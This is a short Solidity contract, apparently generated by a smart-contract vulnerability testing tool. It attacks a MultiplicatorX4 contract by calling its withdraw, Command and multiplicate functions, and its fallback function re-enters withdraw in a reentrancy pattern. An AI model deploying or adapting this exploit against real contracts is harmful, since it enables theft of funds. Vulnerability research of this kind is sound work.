pragma solidity ^0.4.19;

import "./MultiplicatorX4.sol";

contract Attack_MultiplicatorX40 {

  MultiplicatorX4 public target_contract;

  function Attack_MultiplicatorX40(address _targetContract) public payable {
      target_contract = MultiplicatorX4(_targetContract);
  } 

  function vultron_withdraw(uint256 vultron_amount) public payable{
    target_contract.withdraw.value(vultron_amount)();
  } 

  function vultron_Command(uint256 vultron_amount, address adr, bytes data) public payable{
    target_contract.Command.value(vultron_amount)(adr, data);
  } 

  function vultron_multiplicate(uint256 vultron_amount, address adr) public payable{
    target_contract.multiplicate.value(vultron_amount)(adr);
  } 

      function() public payable {
        
        target_contract.withdraw();
      }
      } 
